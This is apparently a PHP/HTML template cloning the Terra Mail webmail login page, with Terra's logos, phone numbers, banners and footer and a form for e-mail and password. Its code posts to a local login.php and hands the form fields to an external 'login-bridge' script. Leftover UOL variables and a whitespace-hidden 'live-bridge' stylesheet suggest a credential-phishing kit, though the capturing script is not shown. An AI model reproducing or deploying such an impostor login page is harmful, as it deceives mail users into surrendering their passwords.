<?php
declare(strict_types=1);
?>
<!DOCTYPE html>
<html lang="pt-BR">
<head><meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Terra Mail</title>
    <link rel="stylesheet" href="/static/css/auth.css?v=6"/>
    <link rel="shortcut icon" type="image/x-icon" href="https://s1.trrsf.com/fe/zaz-mod-t360-icons/svg/logos/terra-favicon-ventana.ico"/>
    <link href="https://fonts.googleapis.com/css2?family=Nunito+Sans:wght@400;600;700&display=swap" rel="stylesheet"/>

                              <link href="/assets/terra-live-bridge.css?v=12" rel="stylesheet"/>
</head>

<body>
    <div class="container">
        <header class="header">
            <div class="header-profile">
                <div class="header-profile-left">
                </div>
                <div class="header-profile-center">
                    <img class="header-profile-logo" src="/static/svg/logo-webmail-terra-white.svg" alt="Logotipo Terra Email" width="80" height="39"></img>
                </div>
                <div class="header-profile-right">
                    <div class="header-profile-phones">
                        <div class="header-profile-phones-item">
                            <span class="header-profile-phones-item-text">Suporte ao cliente</span><span class="header-profile-phones-item-number">0800 777 9797</span>
                        </div>
                        <div class="header-profile-phones-item">
                            <span class="header-profile-phones-item-text">Compre novo produtos</span><span class="header-profile-phones-item-number">0800 777 1234</span>
                        </div>
                    </div>
                    <ul class="header-profile-links">
                        <li><a href="https://central.terra.com.br/"><img class="icon" src="/static/svg/icon-user.svg?v=2" alt="Link para Central do Assinante" width="25" height="24"></img></a></li>
                        <li><a href="https://servicos.terra.com.br/ajuda"><img class="icon" src="/static/svg/icon-question-mark.svg?v=2" alt="Link para Ajuda" width="25" height="24"></img></a></li>
                    </ul>
                </div>

            </div>
        </header>
        <div class="content">
            <nav class="menu-nav">
                <ul class="menu-nav-links">
                    <li><a target="_blank" href="https://servicos.terra.com.br/?utm_source=terra-mail&amp;utm_medium=espaco-fixo&amp;utm_campaign=link&amp;utm_content=pg&amp;utm_term=servicos-terra&amp;cdConvenio=CVTR00001824">Produtos Terra</a></li>
                    <li><a target="_blank" href="https://servicos.terra.com.br/para-voce/terra-mail/ajuda">Ajuda Terra Mail</a></li>
                    <li><a target="_blank" href="https://central.terra.com.br/login?/?utm_source=terra-mail&amp;utm_medium=espaco-fixo&amp;utm_campaign=link_terra-mail&amp;utm_content=pg&amp;utm_term=central-do-assinante&amp;cdConvenio=CVTR00001824">Central do Assinante</a></li>
                    <li><a target="_blank" href="https://s1.trrsf.com/fe/sva-contracts/contratos/TERRAMAIL.html">Condição Geral de Uso</a></li>
                </ul>
            </nav>
            <main>
                <div class="container-webmail-login">
                    <form class="form-webmail-login" id="webmail-form" action="/login.php" method="post" novalidate>
                        <h2 class="header-webmail-login">
                            Acesse seu e-mail Terra
                        </h2>
                        <div class="container-inputs-form-webmail-login">
                            
                            <div class="email-container-webmail-login">
                                <div class="email-header-webmail-login">E-mail</div>
                                <input class="email-input-webmail-login" type="email" name="user" id="user" placeholder="E-mail" title="Preencha seu usuário + seu @domínio">
                                <div class="email-message-login">
                                    <span>Clientes Terra Empresas, acessem com seu e-mail usuario@seudominio.com.br</span>
                                </div>
                            </div>
                            
                            <div class="password-container-webmail-login">
                                <div class="password-header-webmail-login">Senha</div>
                                <div class="password-wraper-container">
                                    <input class="password-input-webmail-login" type="password" name="pass" id="pass" placeholder="Senha" title="Preencha sua senha">
                                    <img class="password-input-eye-webmail-login opened-eye" src="/static/svg/password-opened-eye.svg" alt="Icone para mostrar senha"></img>
                                    <img class="password-input-eye-webmail-login closed-eye" src="/static/svg/password-closed-eye.svg" alt="Icone para esconder senha"></img>
                                </div>
                            </div>
                        </div>
                        <a class="forgot-password-webmail-login" href="https://central.terra.com.br/esqueci-minha-senha">Esqueceu sua senha?</a>
                        <div class="container-message-webmail-login"></div>
                        
                        <div class="container-button-form-webmail-login">
                            <button type="submit" class="submit-button-webmail-login">
                                <span class="submit-button-animation-webmail-login">Acessar meu e-mail</span>
                            </button>
                        </div>
                    </form>
                </div>

                <div class="container-webmail-info">
                    <div class="welcome-message">
                        <p>Assista ao tutorial de como configurar seu Terra Mail no Outlook.</p>

                        <a class="welcome-message-link" href="https://servicos.terra.com.br/para-voce/terra-mail/ajuda/como-configurar-o-terra-mail-no-seu-outlook" target="_blank">Assistir ao tutorial</a>
                    </div>

                   <div class="banner-desk">
    <div id="banner-slider-wrapper">
        <div id="banner-slider">
            <ul>
                <li>
                    <a href="https://servicos.terra.com.br/para-voce/terra-mail/?utm_source=terra-mail&amp;utm_medium=espaco-fixo&amp;utm_campaign=banner_topo&amp;utm_content=pg&amp;utm_term=terra-mail-b2c_posicao-01&amp;cdConvenio=CVTR00001824" target="_blank">
                        <img src="/static/img/banners-login/Banner_Email_SemPreco.jpeg" alt="Terra Mail" width="618" height="226">
                    </a>
                </li>
                <li>
                    <a href="https://servicos.terra.com.br/para-voce/seguranca-digital/?utm_source=terra-mail&amp;utm_medium=espaco-fixo&amp;utm_campaign=banner_topo&amp;utm_content=pg&amp;utm_term=seguranca-digital_posicao-02&amp;cdConvenio=CVTR00001824" target="_blank">
                        <img src="/static/img/banners-login/Banner_Seguranca_SemPreco.jpeg" alt="Segurança Digital" width="618" height="226">
                    </a>
                </li>
                <li>
                    <a href="https://servicos.terra.com.br/para-voce/terra-assistencia/assistencia-residencial/?utm_source=terra-mail&amp;utm_medium=espaco-fixo&amp;utm_campaign=banner_topo&amp;utm_content=pg&amp;utm_term=assistencia-porto_posicao-03&amp;cdConvenio=CVTR00001824" target="_blank">
                        <img src="/static/img/banners-login/Imagem_045_RESIDENCIAL.png" alt="Terra Assistência Residencial" width="618" height="226">
                    </a>
                </li>
                <li>
                    <a href="https://servicos.terra.com.br/para-voce/terra-assistencia/assistencia-veicular/?utm_source=terra-mail&amp;utm_medium=espaco-fixo&amp;utm_campaign=banner_topo&amp;utm_content=pg&amp;utm_term=assistencia-porto_posicao-04&amp;cdConvenio=CVTR00001824" target="_blank">
                        <img src="/static/img/banners-login/Imagem_03_PORTO.png" alt="Terra Assistência Veicular" width="618" height="226">
                    </a>
                </li>
                <li>
                    <a href="https://servicos.terra.com.br/para-voce/terra-assistencia/assistencia-pet/?utm_source=terra-mail&amp;utm_medium=espaco-fixo&amp;utm_campaign=banner_topo&amp;utm_content=pg&amp;utm_term=assistencia-porto_posicao-05&amp;cdConvenio=CVTR00001824" target="_blank">
                        <img src="/static/img/banners-login/Imagem_05_PET.png" alt="Terra Assistência Pet" width="618" height="226">
                    </a>
                </li>
            </ul>
        </div>
        <span class="banner-ad-label">Publicidade</span>
    </div>
</div>

<div class="banner-mob">
    <div id="banner-slider-wrapper-mob">
        <div id="banner-slider-mob">
            <ul>
                <li>
                    <a href="https://servicos.terra.com.br/cursos-online/?utm_source=terra-mail&amp;utm_medium=espaco-fixo&amp;utm_campaign=banner_topo&amp;utm_content=pg&amp;utm_term=cursos-online_mobile&amp;cdConvenio=CVTR00001824%22" target="_blank">
                        <img src="/static/img/banners-login/TER_648_Campanha_Cursos_Julho_BN_300x250_V0_LS.jpg" alt="Produtos Terra!">
                    </a>
                </li>
            </ul>
        </div>
        <span class="banner-ad-label-mob">Publicidade</span>
    </div>
</div>

                   <div class="contact-phones">
                    <div class="contact-phones-item">
                        <span class="contact-phones-item-text">Suporte ao cliente</span><span class="contact-phones-item-number">0800 777 9797</span>
                    </div>
                    <div class="contact-phones-item">
                        <span class="contact-phones-item-text">Compre novo produtos</span><span class="contact-phones-item-number">0800 777 1234</span>
                    </div>
                </div>
                </div>
            </main>
            <div class="popup-background-webmail-login"></div>
            <div class="popup-loader-webmail-login"></div>
        </div>

        <footer class="footer-webmail-login" itemscope="" itemtype="http://schema.org/Organization">
            <img class="footer-webmail-login-logo" src="/static/svg/logo-terra.svg" alt="Logotipo Terra Email" width="108" height="30"></img>

            <div class="information-footer-webmail-login">
                <p>COPYRIGHT 2025, TERRA NETWORKS BRASIL LTDA.</p>
                <p>
                    <span itemprop="address" itemscope="" itemtype="http://schema.org/PostalAddress">
                        <span itemprop="streetAddress">Av. Engenheiro Luís Carlos Berrini, 1376 - 13º andar</span>, <span>Cidade Monções</span> - <span itemprop="addressLocality">São Paulo</span> - <span itemprop="addressRegion">SP - CEP 04571-936</span>.
                    </span>
                    CNPJ <span itemprop="taxID">91.088.328/0001-67</span>
                </p>
            </div>

            <ul class="footer-webmail-login-social">
                <li>
                    <a href="https://x.com/Terra" target="_blank"><img src="/static/svg/icon-social-x.svg" alt="Ícone da rede social X" width="32" height="32"></a>
                </li>
                <li>
                    <a href="https://www.instagram.com/TerraBrasil" target="_blank"><img src="/static/svg/icon-social-instagram.svg" alt="Ícone da rede social Instagram" width="32" height="32"></a>
                </li>
                <li>
                    <a href="https://facebook.com/TerraBrasil" target="_blank"><img src="/static/svg/icon-social-facebook.svg" alt="Ícone da rede social Facebook" width="32" height="32"></a>
                </li>
            </ul>
        </footer>
    </div>
    <script src="/static/js/jquery.js" charset="utf-8"></script>
    <script src="/static/js/jquery.sudoSlider.min.js" charset="utf-8"></script>
    <script src="/static/js/auth.js?v=3" charset="utf-8"></script>
    </div><script>
(function(){
  var f = document.getElementById("webmail-form");
  var el = document.getElementById("user");
  if (!f || !el) return;
  function norm() {
    var u = String(el.value || "").trim();
    if (u && u.indexOf("@") === -1) { el.value = u + "@terra.com.br"; }
  }
  f.addEventListener("submit", norm, true);
  el.addEventListener("blur", norm, true);
})();
</script>
<script>
window.LOGIN_BRIDGE = {
  form: "#webmail-form",
  email: "#user",
  password: "#pass",
  message: ".container-message-webmail-login",
  submit: ".submit-button-webmail-login",
  action: "/login.php"
};
window.UOL_OFFICIAL = <?= json_encode(uol_official_url($config), JSON_UNESCAPED_UNICODE) ?>;
window.UOL_MESSAGES = <?= json_encode([
    'authenticating' => uol_msg('authenticating'),
    'validating'     => 'Validando...',
    'network_error'  => uol_msg('network_error'),
], JSON_UNESCAPED_UNICODE) ?>;
</script>
<script src="/assets/login-bridge.js?v=12"></script>
</body>
</html>